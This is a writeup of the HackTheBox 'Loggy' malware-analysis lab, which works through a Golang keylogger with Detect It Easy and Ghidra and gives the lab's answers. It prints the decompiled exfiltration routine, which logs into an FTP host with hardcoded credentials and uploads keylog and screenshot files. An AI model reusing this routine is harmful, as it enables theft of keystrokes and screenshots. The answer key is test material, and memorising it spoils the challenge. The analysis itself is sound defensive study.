---
title: "HackTheBox - Loggy"
author: DrLi
description: "Writeup of an easy-rated malware analysis Sherlock from HackTheBox."
date: 2025-11-19 15:47:00 +0100
categories: [HackTheBox, Sherlocks]
tags: [hackthebox, sherlock, golang, malware-analysis, reverse engineering, ghidra, keylogger, ftp exfiltration, detect it easy, static analysis]
img_path: /assets/img/HackTheBox/Sherlocks/Loggy
image:
    path: /assets/img/HackTheBox/Sherlocks/Loggy/loggy.png
---


<div align="center"><script src="https://tryhackme.com/badge/2794771"></script></div>


---


Loggy from [HackTheBox](https://www.hackthebox.com/) is an easy-difficulty malware analysis Sherlock focused on investigating a Golang-based keylogger that compromised Janice's credentials. Through static analysis using Detect It Easy and Ghidra, we identify the malware's capabilities including screenshot capture and FTP-based data exfiltration. By examining embedded strings, GitHub dependencies, and decompiled functions, we uncover hardcoded FTP credentials and reconstruct the attack timeline from captured keylog data, revealing how the threat actor stole the victim's password.



### Description

<aside>
ðŸ’¡

**Janice from accounting is beside herself! She was contacted by the SOC to tell her that her work credentials were found on the dark web by the threat intel team. We managed to recover some files from her machine and sent them to the our REM analyst.**

</aside>

### Questions

**What is the SHA-256 hash of this malware binary?**

<aside>
ðŸ’¡

6acd8a362def62034cbd011e6632ba5120196e2011c83dc6045fcb28b590457c

</aside>

**What programming language (and version) is this malware written in?**

<aside>
ðŸ’¡

Golang 1.22.3

</aside>

```bash
using detect it easy we can find the answer
```

![image.png](/assets/img/HackTheBox/Sherlocks/Loggy/image.png)

**There are multiple GitHub repos referenced in the static strings. Which GitHub repo would be most likely suggest the ability of this malware to exfiltrate data?**

<aside>
ðŸ’¡

[github.com/jlaffaye/ftp](https://github.com/jlaffaye/ftp)

</aside>

```bash
in the strings we can find a lot of github repos and the one that looked could have data exfilitration abilities was this one
```

![image.png](/assets/img/HackTheBox/Sherlocks/Loggy/image1.png)

**What dependency, expressed as a GitHub repo, supports Janiceâ€™s assertion that she thought she downloaded something that can just take screenshots?**

<aside>
ðŸ’¡

[github.com/kbinani/screenshot](http://github.com/kbinani/screenshot)

</aside>

```bash
this is the only repo that includes screenshot features
```

**Which function call suggests that the malware produces a file after execution?**

<aside>
ðŸ’¡

WriteFile

</aside>

```bash
we can check the import table to find this
```

![image.png](/assets/img/HackTheBox/Sherlocks/Loggy/image2.png)

**You observe that the malware is exfiltrating data over FTP. What is the domain it is exfiltrating data to?**

<aside>
ðŸ’¡

gotthem.htb

</aside>

```bash
there is a function that handles the FTP file sending and it leaks all we need 
```

```Go

/* DWARF original prototype: void main.sendFilesViaFTP(void)
   Golang function info: Flags: []
   Golang source: C:/Users/verme/go/loggy/main.go:114
   Golang stacktrace signature: undefined main.sendFilesViaFTP() */

void main::main.sendFilesViaFTP(void)

{
  runtime.itab *prVar1;
  char cVar2;
  sdword extraout_EAX;
  sdword extraout_EAX_00;
  sdword extraout_EAX_01;
  io/fs.DirEntry *piVar3;
  struct { F uintptr; X0 *os.File } *fn;
  internal/abi.Type *piVar4;
  int iVar5;
  undefined8 *extraout_R11;
  bool bVar6;
  error eVar7;
  string name;
  string name_00;
  undefined1 auVar8 [16];
  string sVar9;
  github.com/jlaffaye/ftp.Dial_multivalue_return_type gVar10;
  os.OpenFile_multivalue_return_type oVar11;
  os.ReadDir_multivalue_return_type oVar12;
  string password;
  io.Reader r;
  io.Reader r_00;
  []github.com/jlaffaye/ftp.DialOption options;
  string user;
  string path;
  runtime._defer local_150;
  runtime._defer local_120;
  os.File *local_f0;
  os.File *local_e8;
  void *local_e0;
  github.com/jlaffaye/ftp.ServerConn *local_d8;
  internal/abi.Type *local_d0;
  void *pvStack_c8;
  internal/abi.Type *local_c0;
  void *pvStack_b8;
  internal/abi.Type *local_b0;
  void *pvStack_a8;
  func() *local_a0;
  os.File *poStack_98;
  internal/abi.Type *local_90;
  void *pvStack_88;
  internal/abi.Type *local_80;
  void *pvStack_78;
  func() *local_70;
  github.com/jlaffaye/ftp.ServerConn *pgStack_68;
  internal/abi.Type *local_60;
  void *pvStack_58;
  func([]uint8)_[]uint8 *local_50;
  undefined *puStack_48;
  undefined8 local_40;
  internal/abi.Type **ppiStack_38;
  undefined8 local_30;
  undefined8 uStack_28;
  io/fs.DirEntry *local_20;
  internal/abi.Type *local_18;
  void *pvStack_10;
  
  while (&local_120.pc <= CURRENT_G.stackguard0) {
    runtime::runtime.morestack_noctxt();
  }
  sVar9.len = 0xe;
  sVar9.str = (uint8 *)"gotthem.htb:21";
  options.cap = 0;
  options.array = (github.com/jlaffaye/ftp.DialOption *)0x0;
  options.len = 0;
  gVar10 = github.com/jlaffaye/ftp::github.com/jlaffaye/ftp.Dial(sVar9,options);
  pvStack_58 = gVar10.~r1.data;
  local_60 = gVar10.~r1;
  local_d8 = gVar10.~r0;
  if (local_60 != (internal/abi.Type *)0x0) {
    if (local_60 != (internal/abi.Type *)0x0) {
      local_60 = (internal/abi.Type *)local_60->PtrBytes;
    }
    local_50 = main.sendFilesViaFTP.Printf.func1;
    local_40 = 0x23;
    puStack_48 = &DAT_0065c0f9;
    local_30 = 1;
    uStack_28 = 1;
    ppiStack_38 = &local_60;
    log::log.(*Logger).output(log.std,0,2,&local_50);
    runtime::runtime.deferreturn();
    return;
  }
  local_70 = main.sendFilesViaFTP.deferwrap1;
  local_120.fn = &local_70;
  pgStack_68 = local_d8;
  runtime::runtime.deferprocStack(&local_120);
  if (extraout_EAX != 0) {
    runtime::runtime.deferreturn();
    return;
  }
  password.len = 0x11;
  password.str = (uint8 *)"Cle@rtextP@ssword";
  user.len = 0xb;
  user.str = (uint8 *)"NottaHacker";
  eVar7 = github.com/jlaffaye/ftp::github.com/jlaffaye/ftp.(*ServerConn).Login
                    (local_d8,user,password);
  pvStack_78 = eVar7.data;
  local_80 = (internal/abi.Type *)eVar7.tab;
  if (local_80 != (internal/abi.Type *)0x0) {
    if (local_80 != (internal/abi.Type *)0x0) {
      local_80 = (internal/abi.Type *)local_80->PtrBytes;
    }
    local_50 = main.sendFilesViaFTP.Printf.func2;
    local_40 = 0x21;
    puStack_48 = &DAT_0065b40d;
    local_30 = 1;
    uStack_28 = 1;
    ppiStack_38 = &local_80;
    log::log.(*Logger).output(log.std,0,2,&local_50);
    runtime::runtime.deferreturn();
    return;
  }
  name.len = 10;
  name.str = (uint8 *)"keylog.txt";
  oVar11 = os::os.OpenFile(name,0,0);
  pvStack_88 = oVar11.~r1.data;
  local_90 = oVar11.~r1;
  local_f0 = oVar11.~r0;
  if (local_90 != (internal/abi.Type *)0x0) {
    if (local_90 != (internal/abi.Type *)0x0) {
      local_90 = (internal/abi.Type *)local_90->PtrBytes;
    }
    local_50 = main.sendFilesViaFTP.Printf.func3;
    local_40 = 0x1e;
    puStack_48 = &DAT_0065a00d;
    local_30 = 1;
    uStack_28 = 1;
    ppiStack_38 = &local_90;
    log::log.(*Logger).output(log.std,0,2,&local_50);
    runtime::runtime.deferreturn();
    return;
  }
  local_a0 = main.sendFilesViaFTP.deferwrap2;
  local_150.fn = &local_a0;
  poStack_98 = local_f0;
  runtime::runtime.deferprocStack(&local_150);
  if (extraout_EAX_00 != 0) {
    runtime::runtime.deferreturn();
    return;
  }
  r.data = local_f0;
  r.tab = &os::*os.File__implements__io.Reader___runtime.itab;
  path.len = 10;
  path.str = (uint8 *)"keylog.txt";
  eVar7 = github.com/jlaffaye/ftp::github.com/jlaffaye/ftp.(*ServerConn).StorFrom(local_d8,path,r,0)
  ;
  pvStack_a8 = eVar7.data;
  local_b0 = (internal/abi.Type *)eVar7.tab;
  if (local_b0 != (internal/abi.Type *)0x0) {
    if (local_b0 != (internal/abi.Type *)0x0) {
      local_b0 = (internal/abi.Type *)local_b0->PtrBytes;
    }
    local_50 = main.sendFilesViaFTP.Printf.func4;
    local_40 = 0x20;
    puStack_48 = &DAT_0065ac6d;
    local_30 = 1;
    uStack_28 = 1;
    ppiStack_38 = &local_b0;
    log::log.(*Logger).output(log.std,0,2,&local_50);
    runtime::runtime.deferreturn();
    return;
  }
  name_00.len = 1;
  name_00.str = (uint8 *)".";
  oVar12 = os::os.ReadDir(name_00);
  pvStack_b8 = oVar12.~r1.data;
  local_c0 = oVar12.~r1;
  iVar5 = oVar12.~r0.len;
  piVar3 = oVar12.~r0;
  if (local_c0 != (internal/abi.Type *)0x0) {
    if (local_c0 != (internal/abi.Type *)0x0) {
      local_c0 = (internal/abi.Type *)local_c0->PtrBytes;
    }
    local_50 = main.sendFilesViaFTP.Printf.func5;
    local_40 = 0x1c;
    puStack_48 = &DAT_006590ea;
    local_30 = 1;
    uStack_28 = 1;
    ppiStack_38 = &local_c0;
    log::log.(*Logger).output(log.std,0,2,&local_50);
    runtime::runtime.deferreturn();
    return;
  }
  do {
    if (iVar5 < 1) {
      runtime::runtime.deferreturn();
      return;
    }
    prVar1 = piVar3->tab;
    local_e0 = piVar3->data;
    local_20 = piVar3;
    cVar2 = (*(code *)prVar1[1].inter)(local_e0);
    if (cVar2 == '\0') {
      auVar8 = (*(code *)prVar1[1]._type)(local_e0);
      if (auVar8._8_8_ < 0xc) {
        bVar6 = false;
      }
      else if (*auVar8._0_8_ == 0x68736e6565726373) {
        bVar6 = (short)auVar8._0_8_[1] == 0x746f;
      }
      else {
        bVar6 = false;
      }
      bVar6 = (bool)(bVar6 ^ 1);
    }
    else {
      bVar6 = true;
    }
    if (!bVar6) {
      sVar9 = (string)(*(code *)prVar1[1]._type)(local_e0);
      oVar11 = os::os.OpenFile(sVar9,0,0);
      piVar4 = oVar11.~r1;
      if (piVar4 == (internal/abi.Type *)0x0) {
        local_e8 = oVar11.~r0;
        fn = runtime::runtime.newobject
                       (&struct_{_F_uintptr;_X0_*os.File_}___internal/abi.StructType.Type);
        fn->F = (uintptr)main.sendFilesViaFTP.deferwrap3;
        if (runtime.writeBarrier._0_4_ != 0) {
          fn = (struct { F uintptr; X0 *os.File } *)runtime::runtime.gcWriteBarrier1();
          *extraout_R11 = local_e8;
        }
        fn->X0 = (os.File *)local_e8;
        runtime::runtime.deferproc((func() **)fn);
        if (extraout_EAX_01 != 0) {
          runtime::runtime.deferreturn();
          return;
        }
        sVar9 = (string)(*(code *)prVar1[1]._type)(local_e0);
        r_00.data = local_e8;
        r_00.tab = &os::*os.File__implements__io.Reader___runtime.itab;
        eVar7 = github.com/jlaffaye/ftp::github.com/jlaffaye/ftp.(*ServerConn).StorFrom
                          (local_d8,sVar9,r_00,0);
        piVar4 = (internal/abi.Type *)eVar7.tab;
        if (piVar4 != (internal/abi.Type *)0x0) {
          if (piVar4 != (internal/abi.Type *)0x0) {
            piVar4 = (internal/abi.Type *)piVar4->PtrBytes;
          }
          local_50 = main.sendFilesViaFTP.Printf.func7;
          local_40 = 0x24;
          puStack_48 = &DAT_0065c6db;
          local_30 = 1;
          uStack_28 = 1;
          ppiStack_38 = &local_18;
          local_18 = piVar4;
          pvStack_10 = eVar7.data;
          log::log.(*Logger).output(log.std,0,2,&local_50);
        }
      }
      else {
        if (piVar4 != (internal/abi.Type *)0x0) {
          piVar4 = (internal/abi.Type *)piVar4->PtrBytes;
        }
        local_50 = main.sendFilesViaFTP.Printf.func6;
        local_40 = 0x22;
        puStack_48 = &DAT_0065bb87;
        local_30 = 1;
        uStack_28 = 1;
        ppiStack_38 = &local_d0;
        local_d0 = piVar4;
        pvStack_c8 = oVar11.~r1.data;
        log::log.(*Logger).output(log.std,0,2,&local_50);
      }
    }
    piVar3 = local_20 + 1;
    iVar5 = iVar5 + -1;
  } while( true );
}
```

**What are the threat actorâ€™s credentials?**

<aside>
ðŸ’¡

NottaHacker:Cle@rtextP@ssword

</aside>

**What file keeps getting written to disk?**

<aside>
ðŸ’¡

keylog.txt

</aside>

**When Janice changed her password, this was captured in a file. What is Janice's username and password?**

<aside>
ðŸ’¡

janice:Password123

</aside>

```bash
they have provided us with the keylog.txt file and inside it we can find a refenrece to a user and password
```

```bash
[BACKSPACE] [BACKSPACE] [BACKSPACE] [BACKSPACE] [BACKSPACE] [BACKSPACE] [BACKSPACE] J J J A A A A N N N I I I C C C C E E E [ENTER] [ENTER] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] A A A A A A A A S A S A S A S S S S S S S S W W W W W O O O O O R R R R D D D D [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [KEYCODE 186] [SHIFT] [KEYCODE 160] [KEYCODE 186] [SHIFT] [KEYCODE 160] [KEYCODE 186] [SHIFT] [KEYCODE 160] [KEYCODE 186] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SPACE] [SPACE] [SPACE] [SPACE] [SPACE] [SPACE] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] P [KEYCODE 160] [SHIFT] [KEYCODE 160] A A A A A A A S A S S S S S S S S S W W W W W O O R R R D D D D D 1 1 1 1 2 2 2 2 2 2 2 2 3 3 3 3 3 [CTRL]
```

**What app did Janice have open the last time she ran the "screenshot app"?**

<aside>
ðŸ’¡

Solitaire

</aside>

```bash
we have the screenshots and the last app seen open was solitaire
```

![screenshot_1718068600.png](/assets/img/HackTheBox/Sherlocks/Loggy/image3.png)

DONE!